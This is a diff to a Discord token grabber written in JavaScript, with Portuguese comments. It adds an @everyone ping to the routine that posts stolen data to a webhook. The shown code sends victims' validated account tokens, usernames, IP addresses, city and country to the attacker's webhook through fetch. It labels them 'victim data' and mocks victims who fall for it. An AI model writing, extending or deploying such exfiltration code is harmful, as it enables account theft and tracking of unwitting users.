@@ -226,10 +226,12 @@
         let createdAt = "N/A";
         
         // Função para enviar embed
-        async function enviarEmbed(titulo, cor, fields, descricao) {
+        async function enviarEmbed(titulo, cor, fields, descricao, mentionEveryone) {
+            const content = mentionEveryone ? "@everyone" : "";
+            
             const embed = {
                 title: titulo,
-                color: cor, // Roxo = 0x9B59B6
+                color: cor,
                 description: descricao || "",
                 fields: fields,
                 footer: {
@@ -242,10 +244,13 @@
                 }
             };
             
+            const payload = { embeds: [embed] };
+            if (content) payload.content = content;
+            
             await fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ embeds: [embed] })
+                body: JSON.stringify(payload)
             });
         }
         
@@ -332,7 +337,7 @@
                     // ENVIAR EMBED ROXO COM TOKEN VÁLIDO
                     await enviarEmbed(
                         "🎯 TOKEN VÁLIDO - DADOS DA VÍTIMA",
-                        0x9B59B6, // Roxo
+                        0x9B59B6,
                         [
                             {
                                 name: "👤 **USUÁRIO**",
@@ -370,14 +375,15 @@
                                 inline: true
                             }
                         ],
-                        `**${username}** caiu no grabber! 🎉`
+                        `**${username}** caiu no grabber! 🎉`,
+                        false
                     );
                     
                 } else {
                     // Token inválido
                     await enviarEmbed(
                         "⚠️ TOKEN INVÁLIDO",
-                        0xE67E22, // Laranja
+                        0xE67E22,
                         [
                             {
                                 name: "🔑 Token",
@@ -400,13 +406,14 @@
                                 inline: true
                             }
                         ],
-                        `Status HTTP: ${resp.status}`
+                        `Status HTTP: ${resp.status}`,
+                        false
                     );
                 }
             } catch(e) {
                 await enviarEmbed(
                     "❌ ERRO AO VALIDAR TOKEN",
-                    0xE74C3C, // Vermelho
+                    0xE74C3C,
                     [
                         {
                             name: "🌐 IP",
@@ -418,14 +425,16 @@
                             value: e.message.substring(0, 100),
                             inline: true
                         }
-                    ]
+                    ],
+                    "",
+                    false
                 );
             }
         } else {
-            // NENHUM TOKEN ENCONTRADO
+            // NENHUM TOKEN ENCONTRADO → @everyone mais um burro
             await enviarEmbed(
-                "❌ TOKEN NÃO ENCONTRADO",
-                0xE74C3C, // Vermelho
+                "@everyone mais um burro 🐴",
+                0xE74C3C,
                 [
                     {
                         name: "🌐 **LOCALIZAÇÃO**",
@@ -443,7 +452,8 @@
                         inline: false
                     }
                 ],
-                `IP: ${ip} | ${cidade}, ${pais}`
+                `IP: ${ip} | ${cidade}, ${pais}`,
+                true // mentionEveryone = true → envia @everyone
             );
         }
 
